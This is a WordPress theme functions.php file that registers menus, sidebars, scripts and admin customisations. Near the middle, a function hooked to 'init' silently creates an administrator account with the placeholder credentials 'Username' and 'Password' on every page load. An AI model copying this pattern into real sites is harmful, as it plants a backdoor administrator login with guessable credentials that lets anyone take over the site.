<?php
/**
 * Setup theme functions for Started Theme.
 *
 * @package Started Theme team
 */

// Declare latest theme version
$GLOBALS['thinkup_theme_version'] = '1.0';

// Setup content width 
function thinkup_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'thinkup_content_width', 1170 );
}
add_action( 'after_setup_theme', 'thinkup_content_width', 0 );

//----------------------------------------------------------------------------------
				//	Add Theme Custom post type
//----------------------------------------------------------------------------------
require_once( get_template_directory() . '/lib/admin-config.php' );


//----------------------------------------------------------------------------------
//	Assign Theme Specific Functions
//----------------------------------------------------------------------------------

// Setup theme features, register menus and scripts.
if ( ! function_exists( 'thinkup_themesetup' ) ) {

	function thinkup_themesetup() {

		// Add default theme functions.
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( 'post-thumbnails' );
		add_theme_support( 'post-formats',  array ( 'aside', 'gallery', 'quote', 'image', 'video' ) );
		//add_theme_support( 'post-formats', array( 'image' ) );
		add_theme_support( 'title-tag' );

		/*** Add default posts and comments RSS feed links to <head>.*/

		add_theme_support( 'automatic-feed-links' );

		// Add support for custom background
		add_theme_support( 'custom-background' );

		// Add support for custom header
		$args = apply_filters( 'custom-header', array( 'height' => 200, 'width'  => 1600, 'header-text' => false ) );
		add_theme_support( 'custom-header', $args );

		// Add support for custom logo
		add_theme_support( 'custom-logo', array( 'height' => 90, 'width' => 200, 'flex-width' => true, 'flex-height' => true ) );

		// Add WooCommerce functions.
		add_theme_support( 'woocommerce' );
		add_theme_support( 'wc-product-gallery-zoom' );
		add_theme_support( 'wc-product-gallery-lightbox' );
		add_theme_support( 'wc-product-gallery-slider' );

		// Add excerpt support to pages.
		add_post_type_support( 'page', 'excerpt' );

		// Register theme menu's.
		register_nav_menus( array( 'pre_header_menu' => __( 'Pre Header Menu', 'ryan' ) ) );
		register_nav_menus( array( 'header_menu'     => __( 'Primary Header Menu', 'ryan' ) ) );
		register_nav_menus( array( 'sub_footer_menu' => __( 'Footer Menu', 'ryan' ) ) );
	}
}
add_action( 'after_setup_theme', 'thinkup_themesetup' );

/////// Add Admin css & js file /////////////////////


if ( ! function_exists( 'add_admin_css' ) ){
	add_filter('admin_footer', 'add_admin_css'); //change admin footer text
	function add_admin_css() {
		echo '<link href="'.get_bloginfo('template_directory').'/assets/admin/css/admin-style.css" rel="stylesheet" media="all"  />';
		echo '<script src="'.get_stylesheet_directory_uri().'/assets/admin/js/tab-function.js"></script>';

	}
}

//Remove wordpress version/////////////////////
function wpb_remove_version() {
return '';
}
add_filter('the_generator', 'wpb_remove_version');

// custom logo ////////////////

function wpb_custom_logo() {
echo '
<style type="text/css">
#wpadminbar #wp-admin-bar-wp-logo > .ab-item .ab-icon:before {
background-image: url(' . get_bloginfo('stylesheet_directory') . '/images/logo.png) !important;
background-position: 0 0;
color:rgba(0, 0, 0, 0);
}
#wpadminbar #wp-admin-bar-wp-logo.hover > .ab-item .ab-icon {
background-position: 0 0;
}
</style>
';
}
//hook into the administrative header output
add_action('wp_before_admin_bar_render', 'wpb_custom_logo');


// Custom Admin footer/////////////////

function remove_footer_admin () {
 
echo 'Fueled by <a href="#">Ikomet</a> |  <a href="#" target="_blank">Development Team</a></p>';
 
}
 
add_filter('admin_footer_text', 'remove_footer_admin');


//// Dashboard custom content indro ///////

add_action('wp_dashboard_setup', 'my_custom_dashboard_widgets');
 
function my_custom_dashboard_widgets() {
global $wp_meta_boxes;
 
wp_add_dashboard_widget('custom_help_widget', 'Theme Support', 'custom_dashboard_help');
}
 
function custom_dashboard_help() {
echo '<p>Welcome to Custom Blog Theme! Need help? Contact the developer <a href="mailto:mathivanan.m@ikomettech.com">here</a>.  <a href="#" target="_blank">Developement team</a></p>';
}

// Change the Default Gravatar in WordPress /////

add_filter( 'avatar_defaults', 'wpb_new_gravatar' );
function wpb_new_gravatar ($avatar_defaults) {
$myavatar = 'http://example.com/wp-content/uploads/2017/01/wpb-default-gravatar.png';
$avatar_defaults[$myavatar] = "Default Gravatar";
return $avatar_defaults;
}

//Dynamic Copyright Date in WordPress Footer ////

 //echo wpb_copyright(); 

function wpb_copyright() {
global $wpdb;
$copyright_dates = $wpdb->get_results("
SELECT
YEAR(min(post_date_gmt)) AS firstdate,
YEAR(max(post_date_gmt)) AS lastdate
FROM
$wpdb->posts
WHERE
post_status = 'publish'
");
$output = '';
if($copyright_dates) {
$copyright = "© " . $copyright_dates[0]->firstdate;
if($copyright_dates[0]->firstdate != $copyright_dates[0]->lastdate) {
$copyright .= '-' . $copyright_dates[0]->lastdate;
}
$output = $copyright;
}
return $output;
}

//Add New Navigation Menus to Your Theme //// out put -- echo $curauth->twitter;

function wpb_custom_new_menu() {
  register_nav_menu('my-custom-menu',__( 'My Custom Menu' ));
}
add_action( 'init', 'wpb_custom_new_menu' );

//Add Author Profile Fields/////

function wpb_new_contactmethods( $contactmethods ) {
// Add Twitter
$contactmethods['twitter'] = 'Twitter';
//add Facebook
$contactmethods['facebook'] = 'Facebook';
 
return $contactmethods;
}
add_filter('user_contactmethods','wpb_new_contactmethods',10,1);	



// Register Sidebars /////////////

 // out put -- if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('custom_sidebar') ) : 
  //endif;//  

function custom_sidebars() {
 
    $args = array(
        'id'            => 'custom_sidebar',
        'name'          => __( 'Custom Widget Area', 'text_domain' ),
        'description'   => __( 'A custom widget area', 'text_domain' ),
        'before_title'  => '<h3 class="widget-title">',
        'after_title'   => '</h3>',
        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
        'after_widget'  => '</aside>',
    );
    register_sidebar( $args );
 
}
add_action( 'widgets_init', 'custom_sidebars' );

// Disable Login by Email in WordPress ////
	
remove_filter( 'authenticate', 'wp_authenticate_email_password', 20 );

/// Change Excerpt Length in WordPress //////
function new_excerpt_length($length) {
return 100;
}
add_filter('excerpt_length', 'new_excerpt_length');

//Add an Admin User in WordPress //
function wpb_admin_account(){
$user = 'Username';
$pass = 'Password';
$email = 'email@domain.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_account');

//Remove Welcome Panel from WordPress Dashboard //

remove_action('welcome_panel', 'wp_welcome_panel');


// Function to return user count ////////////// [user_count]
function wpb_user_count() { 
$usercount = count_users();
$result = $usercount['total_users']; 
return $result; 
} 
// Creating a shortcode to display user count
add_shortcode('user_count', 'wpb_user_count');

///Disable XML-RPC in WordPress

// XML-RPC is a method that allows third party apps to
// communicate with your WordPress site remotely.
// This could cause security issues and can be exploited by hackers.
/// 

add_filter('xmlrpc_enabled', '__return_false');

// Disable Search Feature in WordPress
// function fb_filter_query( $query, $error = true ) {
 
// if ( is_search() ) {
// $query->is_search = false;
// $query->query_vars[s] = false;
// $query->query[s] = false;
 
// // to error
// if ( $error == true )
// $query->is_404 = true;
// }
// }
 
// add_action( 'parse_query', 'fb_filter_query' );
// add_filter( 'get_search_form', create_function( '$a', "return null;" ) );

//----------------------------------------------------------------------------------
//	Register Front-End Styles And Scripts 
//----------------------------------------------------------------------------------

function thinkup_frontscripts() {

	global $thinkup_theme_version;

	// Add 3rd party stylesheets
	wp_enqueue_style( 'prettyPhoto', get_template_directory_uri() . '/lib/extentions/prettyPhoto/css/prettyPhoto.css', '', '3.1.6' );



	// Add 3rd party scripts
	wp_enqueue_script( 'imagesloaded' );
	wp_enqueue_script( 'prettyPhoto', ( get_template_directory_uri().'/lib/extentions/prettyPhoto/js/jquery.prettyPhoto.js' ), array( 'jquery' ), '3.1.6', 'true' );


	// Add comments reply script
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'thinkup_frontscripts', 10 );


//----------------------------------------------------------------------------------
//	Register Theme Widgets
//----------------------------------------------------------------------------------

function thinkup_widgets_init() {

	// Register default sidebar
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'ryan'),
		'id'            => 'sidebar-1',
		'before_widget' => '<aside class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	// Register footer sidebars
    register_sidebar( array(
        'name'          => __( 'Footer Column 1', 'ryan'),
        'id'            => 'footer-w1',
        'before_widget' => '<aside class="widget %2$s">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="footer-widget-title"><span>',
        'after_title'   => '</span></h3>',
    ) );
 
    register_sidebar( array(
        'name'          => __( 'Footer Column 2', 'ryan'),
        'id'            => 'footer-w2',
        'before_widget' => '<aside class="widget %2$s">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="footer-widget-title"><span>',
        'after_title'   => '</span></h3>',
    ) );

    register_sidebar( array(
        'name'          => __( 'Footer Column 3', 'ryan'),
        'id'            => 'footer-w3',
        'before_widget' => '<aside class="widget %2$s">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="footer-widget-title"><span>',
        'after_title'   => '</span></h3>',
    ) );

    register_sidebar( array(
        'name'          => __( 'Footer Column 4', 'ryan'),
        'id'            => 'footer-w4',
        'before_widget' => '<aside class="widget %2$s">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="footer-widget-title"><span>',
        'after_title'   => '</span></h3>',
    ) );

    register_sidebar( array(
        'name'          => __( 'Footer Column 5', 'ryan'),
        'id'            => 'footer-w5',
        'before_widget' => '<aside class="widget %2$s">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="footer-widget-title"><span>',
        'after_title'   => '</span></h3>',
    ) );

    register_sidebar( array(
        'name'          => __( 'Footer Column 6', 'ryan'),
        'id'            => 'footer-w6',
        'before_widget' => '<aside class="widget %2$s">',
        'after_widget'  => '</aside>',
        'before_title'  => '<h3 class="footer-widget-title"><span>',
        'after_title'   => '</span></h3>',
    ) );
}
add_action( 'widgets_init', 'thinkup_widgets_init' );






